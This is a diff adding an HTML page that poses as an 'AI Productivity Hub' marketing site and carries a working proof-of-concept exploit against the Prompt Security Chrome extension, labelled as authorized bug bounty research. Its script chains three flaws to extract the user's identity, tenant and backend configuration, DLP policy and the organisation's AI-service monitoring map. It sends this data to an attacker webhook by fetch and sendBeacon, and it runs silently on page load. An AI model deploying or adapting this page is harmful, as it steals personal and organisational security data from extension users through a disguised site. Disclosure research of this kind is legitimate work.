@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Productivity Hub - Boost Your Workflow</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+        .navbar {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 16px 40px; border-bottom: 1px solid #222;
+        }
+        .logo { font-size: 20px; font-weight: 700; color: #7c3aed; }
+        .nav-links a { color: #999; text-decoration: none; margin-left: 24px; font-size: 14px; }
+        .hero {
+            text-align: center; padding: 80px 20px 40px;
+            max-width: 800px; margin: 0 auto;
+        }
+        .hero h1 { font-size: 48px; font-weight: 800; line-height: 1.1; margin-bottom: 20px; }
+        .hero h1 span { color: #7c3aed; }
+        .hero p { font-size: 18px; color: #888; line-height: 1.6; margin-bottom: 40px; }
+        .cta-btn {
+            background: #7c3aed; color: #fff; border: none; padding: 14px 32px;
+            border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;
+            transition: background 0.2s;
+        }
+        .cta-btn:hover { background: #6d28d9; }
+        .features {
+            display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px;
+            max-width: 1000px; margin: 60px auto; padding: 0 20px;
+        }
+        .feature-card {
+            background: #141414; border: 1px solid #222; border-radius: 12px;
+            padding: 28px; text-align: left;
+        }
+        .feature-card h3 { font-size: 16px; margin-bottom: 8px; color: #fff; }
+        .feature-card p { font-size: 14px; color: #777; line-height: 1.5; }
+        .feature-icon { font-size: 28px; margin-bottom: 12px; }
+        .status-bar {
+            position: fixed; bottom: 0; left: 0; right: 0;
+            background: #111; border-top: 1px solid #222;
+            padding: 10px 40px; font-size: 12px; color: #555;
+            display: flex; justify-content: space-between;
+        }
+        .loading-overlay {
+            display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85); z-index: 1000;
+            justify-content: center; align-items: center; flex-direction: column;
+        }
+        .loading-overlay.active { display: flex; }
+        .spinner {
+            width: 40px; height: 40px; border: 3px solid #333;
+            border-top-color: #7c3aed; border-radius: 50%;
+            animation: spin 0.8s linear infinite; margin-bottom: 16px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text { color: #aaa; font-size: 14px; }
+        .result-panel {
+            display: none; max-width: 700px; margin: 20px auto; padding: 20px;
+            background: #1a1a2e; border: 1px solid #7c3aed; border-radius: 12px;
+        }
+        .result-panel.active { display: block; }
+        .result-panel h3 { color: #7c3aed; margin-bottom: 12px; }
+        .result-item {
+            background: #0f0f1a; padding: 10px 14px; margin: 6px 0;
+            border-radius: 6px; font-family: monospace; font-size: 13px;
+            color: #e0e0e0; word-break: break-all;
+        }
+        .result-item .label { color: #7c3aed; font-weight: 600; }
+        .tag-critical {
+            display: inline-block; background: #dc2626; color: #fff;
+            font-size: 10px; padding: 2px 6px; border-radius: 4px;
+            font-weight: 700; margin-left: 8px; vertical-align: middle;
+        }
+        .tag-success {
+            display: inline-block; background: #16a34a; color: #fff;
+            font-size: 10px; padding: 2px 6px; border-radius: 4px;
+            font-weight: 700; margin-left: 8px;
+        }
+        footer {
+            text-align: center; padding: 40px 20px; color: #444; font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+
+<nav class="navbar">
+    <div class="logo">AI Productivity Hub</div>
+    <div class="nav-links">
+        <a href="#">Features</a>
+        <a href="#">Pricing</a>
+        <a href="#">Blog</a>
+        <a href="#">Sign In</a>
+    </div>
+</nav>
+
+<section class="hero">
+    <h1>Supercharge your <span>AI Workflow</span></h1>
+    <p>The all-in-one platform to manage your AI tools, prompts, and integrations.
+       Connect ChatGPT, Claude, Gemini and more in one unified dashboard.</p>
+    <button class="cta-btn" id="startBtn" onclick="handleGetStarted()">Get Started Free</button>
+</section>
+
+<div class="features">
+    <div class="feature-card">
+        <div class="feature-icon">&#x1f3af;</div>
+        <h3>Prompt Library</h3>
+        <p>Save and organize your best prompts across all AI platforms with version control.</p>
+    </div>
+    <div class="feature-card">
+        <div class="feature-icon">&#x1f50c;</div>
+        <h3>Universal Connect</h3>
+        <p>One-click integration with 20+ AI services. No API keys needed.</p>
+    </div>
+    <div class="feature-card">
+        <div class="feature-icon">&#x1f4ca;</div>
+        <h3>Usage Analytics</h3>
+        <p>Track your AI usage, costs, and productivity metrics in real-time.</p>
+    </div>
+</div>
+
+<!-- PoC results panel (shown after exploit runs) -->
+<div class="result-panel" id="resultsPanel">
+    <h3>&#x26a0;&#xfe0f; Prompt Security Extension PoC — Data Exfiltrated</h3>
+    <p style="color:#aaa; font-size:13px; margin-bottom:16px;">
+        The following data was silently extracted from the Prompt Security Chrome Extension
+        via 3 chained critical vulnerabilities. All data was sent to the attacker's webhook.
+    </p>
+    <div id="resultsContainer"></div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    <div class="loading-text">Setting up your workspace...</div>
+</div>
+
+<footer>
+    <p>This is a security research PoC for the Prompt Security Chrome Extension (v7.0.49).</p>
+    <p>Authorized bug bounty engagement — SentinelOne Red Team.</p>
+</footer>
+
+<div class="status-bar">
+    <span id="statusText">Ready</span>
+    <span>v1.0.0</span>
+</div>
+
+<script>
+/**
+ * =====================================================================
+ * Prompt Security Chrome Extension — PoC Exploit
+ * =====================================================================
+ * Chains 3 Critical Vulnerabilities:
+ *
+ *  CVE-CANDIDATE-1: externally_connectable wildcard + no origin validation
+ *                   in onMessageExternal (background.bundle.js:3363)
+ *
+ *  CVE-CANDIDATE-2: Unrestricted content script message relay forwards
+ *                   any postMessage to background, responds with "*"
+ *                   (content.bundle.js:464-474)
+ *
+ *  CVE-CANDIDATE-3: Page script reads config from DOM #ps_script element
+ *                   (script.bundle.js:376-404)
+ *
+ * Attack flow:
+ *   1. Detect extension via DOM fingerprint
+ *   2. Read leaked policy config from #ps_script dataset
+ *   3. Exfil user identity (email) via onMessageExternal → callProtectApi
+ *   4. Exfil tenant config via content script relay → getPopupSettings
+ *   5. Probe org's AI monitoring policy via callShouldInspectChat
+ *   6. Send everything to attacker's webhook
+ * =====================================================================
+ */
+
+// ── CONFIG ──────────────────────────────────────────────────────────
+// Replace with your webhook.site URL before deploying
+const EXFIL_ENDPOINT = "https://webhook.site/YOUR-UUID-HERE";
+const EXT_ID = "iidnankcocecmgpcafggbgbmkbcldmno";
+// ────────────────────────────────────────────────────────────────────
+
+const collected = {
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent,
+    pageUrl: location.href,
+    extensionDetected: false,
+    extensionId: null,
+    policyConfig: {},
+    userIdentity: {},
+    tenantConfig: {},
+    aiPolicyMap: {},
+    configFromBackend: {}
+};
+
+function setStatus(msg) {
+    document.getElementById("statusText").innerText = msg;
+}
+
+// ── FINDING 3: Read leaked config from DOM ──────────────────────────
+function extractPolicyConfig() {
+    const psScript = document.getElementById("ps_script");
+    if (psScript && psScript.dataset) {
+        const ds = psScript.dataset;
+        collected.policyConfig = {
+            ext_id: ds.ext_id || null,
+            inspect_files: ds.inspect_files || null,
+            inspect_responses: ds.inspect_responses || null,
+            inspect_drive: ds.inspect_drive || null,
+            block_chat_sharing: ds.block_chat_sharing || null,
+            block_chatgpt_training: ds.block_chatgpt_training || null,
+            block_chatgpt_memory: ds.block_chatgpt_memory || null,
+            block_chatgpt_developer_mode: ds.block_chatgpt_developer_mode || null,
+            trace_id: ds.trace_id || null
+        };
+        collected.extensionId = ds.ext_id;
+        return true;
+    }
+    return false;
+}
+
+// ── FINDING 1: Exploit onMessageExternal — callProtectApi ───────────
+// Triggers the extension to resolve user identity (email, machine name)
+// and make an authenticated API call. Response returned to us.
+function exfilUserIdentity() {
+    return new Promise((resolve) => {
+        if (typeof chrome === "undefined" || !chrome.runtime || !chrome.runtime.sendMessage) {
+            resolve(null);
+            return;
+        }
+        try {
+            chrome.runtime.sendMessage(EXT_ID, {
+                message: "callProtectApi",
+                text: "harmless test prompt for security research",
+                userEnteredTexts: { "harmless test prompt for security research": { type: "full_prompt" } },
+                requestUrl: "https://chatgpt.com/backend-api/conversation",
+                url: "https://chatgpt.com",
+                domain: "chatgpt.com",
+                hookMethod: "fetch",
+                isEnterpriseVersion: false,
+                ctx: { flowTraceId: crypto.randomUUID() }
+            }, function (response) {
+                if (chrome.runtime.lastError) {
+                    resolve({ error: chrome.runtime.lastError.message });
+                } else {
+                    resolve(response);
+                }
+            });
+        } catch (e) {
+            resolve({ error: e.message });
+        }
+        // Timeout after 8s
+        setTimeout(() => resolve({ error: "timeout" }), 8000);
+    });
+}
+
+// ── FINDING 1: Probe AI policy via callShouldInspectChat ────────────
+// Reveals which AI services the org monitors/blocks
+function probeAiPolicy(domain) {
+    return new Promise((resolve) => {
+        if (typeof chrome === "undefined" || !chrome.runtime || !chrome.runtime.sendMessage) {
+            resolve(null);
+            return;
+        }
+        try {
+            chrome.runtime.sendMessage(EXT_ID, {
+                message: "callShouldInspectChat",
+                url: `https://${domain}/api/chat/completions`,
+                body: '{"messages":[{"role":"user","content":"test"}]}',
+                pageUrl: `https://${domain}`,
+                pageTitle: domain,
+                optionalFavicons: [],
+                inputTypes: [],
+                isEnterpriseVersion: false,
+                ctx: { flowTraceId: crypto.randomUUID() }
+            }, function (response) {
+                if (chrome.runtime.lastError) {
+                    resolve({ domain, monitored: "error", detail: chrome.runtime.lastError.message });
+                } else {
+                    resolve({ domain, monitored: !!response, rawResponse: response });
+                }
+            });
+        } catch (e) {
+            resolve({ domain, monitored: "error", detail: e.message });
+        }
+        setTimeout(() => resolve({ domain, monitored: "timeout" }), 6000);
+    });
+}
+
+// ── FINDING 2: Content script relay → getPopupSettings ──────────────
+// Extracts tenant config via the unrestricted message relay
+function exfilTenantConfig() {
+    return new Promise((resolve) => {
+        const messageId = Math.random().toString(36).substring(2) + Date.now().toString(36);
+
+        function listener(e) {
+            if (e.data && e.data.type === "FROM_BACKGROUND" && e.data.messageId === messageId) {
+                window.removeEventListener("message", listener);
+                resolve(e.data.response);
+            }
+        }
+        window.addEventListener("message", listener);
+
+        window.postMessage({
+            type: "FROM_PAGE",
+            messageId: messageId,
+            message: { type: "getPopupSettings" }
+        }, "*");
+
+        setTimeout(() => {
+            window.removeEventListener("message", listener);
+            resolve({ error: "timeout" });
+        }, 6000);
+    });
+}
+
+// ── FINDING 2: Content script relay → getConfigFromBackend ──────────
+// Triggers a full config refresh and returns backend config
+function exfilBackendConfig() {
+    return new Promise((resolve) => {
+        const messageId = Math.random().toString(36).substring(2) + Date.now().toString(36);
+
+        function listener(e) {
+            if (e.data && e.data.type === "FROM_BACKGROUND" && e.data.messageId === messageId) {
+                window.removeEventListener("message", listener);
+                resolve(e.data.response);
+            }
+        }
+        window.addEventListener("message", listener);
+
+        window.postMessage({
+            type: "FROM_PAGE",
+            messageId: messageId,
+            message: { type: "getConfigFromBackend" }
+        }, "*");
+
+        setTimeout(() => {
+            window.removeEventListener("message", listener);
+            resolve({ error: "timeout" });
+        }, 6000);
+    });
+}
+
+// ── EXFILTRATION ────────────────────────────────────────────────────
+function sendToWebhook(data) {
+    // Primary: fetch POST
+    fetch(EXFIL_ENDPOINT, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data, null, 2),
+        mode: "no-cors"
+    }).catch(() => {});
+
+    // Backup: navigator.sendBeacon
+    try {
+        navigator.sendBeacon(EXFIL_ENDPOINT,
+            new Blob([JSON.stringify(data)], { type: "application/json" }));
+    } catch (e) {}
+}
+
+// ── DISPLAY RESULTS ─────────────────────────────────────────────────
+function showResults() {
+    const container = document.getElementById("resultsContainer");
+    const panel = document.getElementById("resultsPanel");
+
+    function addResult(label, value, critical = false) {
+        const div = document.createElement("div");
+        div.className = "result-item";
+        const tag = critical
+            ? '<span class="tag-critical">EXFILTRATED</span>'
+            : '<span class="tag-success">CAPTURED</span>';
+        div.innerHTML = `<span class="label">${label}:</span> ${tag}<br>${typeof value === "object" ? JSON.stringify(value, null, 2) : value}`;
+        container.appendChild(div);
+    }
+
+    addResult("Extension Detected", collected.extensionDetected);
+    addResult("Extension ID", collected.extensionId || "N/A");
+
+    if (Object.keys(collected.policyConfig).length > 0) {
+        addResult("DLP Policy Config (Finding 3 — DOM leak)", collected.policyConfig, true);
+    }
+
+    if (collected.userIdentity && !collected.userIdentity.error) {
+        addResult("User Identity / Protect API Response (Finding 1)", collected.userIdentity, true);
+    } else if (collected.userIdentity) {
+        addResult("User Identity Attempt", collected.userIdentity);
+    }
+
+    if (collected.tenantConfig && !collected.tenantConfig.error) {
+        addResult("Tenant Config (Finding 2 — message relay)", collected.tenantConfig, true);
+    }
+
+    if (collected.configFromBackend && !collected.configFromBackend.error) {
+        addResult("Backend Config (Finding 2 — relay)", collected.configFromBackend, true);
+    }
+
+    if (Object.keys(collected.aiPolicyMap).length > 0) {
+        addResult("AI Service Monitoring Policy (Finding 1 — probing)", collected.aiPolicyMap, true);
+    }
+
+    panel.classList.add("active");
+}
+
+// ── MAIN EXPLOIT CHAIN ──────────────────────────────────────────────
+async function runExploit() {
+    setStatus("[1/6] Detecting extension...");
+
+    // Step 1: Detect extension via DOM fingerprint
+    // The content script sets document.documentElement.dataset.psScriptExecuted = "true"
+    // and injects <script id="ps_script"> with config data attributes
+    await new Promise(r => setTimeout(r, 1500)); // wait for content script injection
+
+    const detected = document.documentElement.dataset.psScriptExecuted === "true";
+    collected.extensionDetected = detected;
+
+    if (!detected) {
+        setStatus("Extension not detected on this browser. PoC requires Prompt Security extension.");
+        document.getElementById("loadingOverlay").classList.remove("active");
+
+        // Still show results panel with detection failure
+        const container = document.getElementById("resultsContainer");
+        const panel = document.getElementById("resultsPanel");
+        const div = document.createElement("div");
+        div.className = "result-item";
+        div.innerHTML = '<span class="label">Status:</span> Prompt Security extension NOT detected. Install the extension and revisit this page.';
+        container.appendChild(div);
+        panel.classList.add("active");
+        return;
+    }
+
+    // Step 2: Extract policy config from DOM (Finding 3)
+    setStatus("[2/6] Extracting DLP policy config from DOM...");
+    extractPolicyConfig();
+    await new Promise(r => setTimeout(r, 500));
+
+    // Step 3: Exfiltrate user identity via onMessageExternal (Finding 1)
+    setStatus("[3/6] Extracting user identity via external message API...");
+    collected.userIdentity = await exfilUserIdentity();
+
+    // Step 4: Exfiltrate tenant config via content script relay (Finding 2)
+    setStatus("[4/6] Extracting tenant config via message relay...");
+    collected.tenantConfig = await exfilTenantConfig();
+
+    // Step 5: Probe AI monitoring policy (Finding 1)
+    setStatus("[5/6] Probing organization AI policy...");
+    const aiDomains = [
+        "chatgpt.com", "claude.ai", "gemini.google.com",
+        "copilot.microsoft.com", "grok.com", "perplexity.ai",
+        "chat.deepseek.com", "chat.mistral.ai"
+    ];
+    const policyResults = await Promise.all(aiDomains.map(d => probeAiPolicy(d)));
+    for (const r of policyResults) {
+        if (r) collected.aiPolicyMap[r.domain] = { monitored: r.monitored, raw: r.rawResponse };
+    }
+
+    // Step 5b: Extract backend config via relay (Finding 2)
+    setStatus("[5b/6] Extracting backend configuration...");
+    collected.configFromBackend = await exfilBackendConfig();
+
+    // Step 6: Exfiltrate everything to attacker webhook
+    setStatus("[6/6] Exfiltrating to webhook...");
+    sendToWebhook(collected);
+
+    await new Promise(r => setTimeout(r, 500));
+    setStatus("Exploit chain complete. Data exfiltrated.");
+
+    // Show results to demonstrate impact
+    document.getElementById("loadingOverlay").classList.remove("active");
+    showResults();
+}
+
+// ── TRIGGER ─────────────────────────────────────────────────────────
+function handleGetStarted() {
+    document.getElementById("loadingOverlay").classList.add("active");
+    // Small delay to show loading animation, then run exploit
+    setTimeout(runExploit, 800);
+}
+
+// Also auto-run silently on page load (the real attack vector —
+// no click needed, but we keep the button for demo purposes)
+window.addEventListener("DOMContentLoaded", function() {
+    // Silent auto-run after a brief delay for content script to inject
+    setTimeout(function() {
+        // Only auto-run the data collection, don't show UI
+        // The button click shows the full UI demo
+        if (document.documentElement.dataset.psScriptExecuted === "true") {
+            extractPolicyConfig();
+            // Silently collect and exfil in background
+            Promise.all([
+                exfilUserIdentity(),
+                exfilTenantConfig(),
+                Promise.all(["chatgpt.com","claude.ai","gemini.google.com","copilot.microsoft.com",
+                             "grok.com","perplexity.ai","chat.deepseek.com","chat.mistral.ai"]
+                    .map(d => probeAiPolicy(d)))
+            ]).then(([identity, tenant, policies]) => {
+                const silentData = {
+                    mode: "silent_auto",
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    extensionId: collected.extensionId,
+                    policyConfig: collected.policyConfig,
+                    userIdentity: identity,
+                    tenantConfig: tenant,
+                    aiPolicyMap: {}
+                };
+                for (const r of policies) {
+                    if (r) silentData.aiPolicyMap[r.domain] = { monitored: r.monitored };
+                }
+                sendToWebhook(silentData);
+            }).catch(() => {});
+        }
+    }, 2000);
+});
+</script>
+
+</body>
+</html>
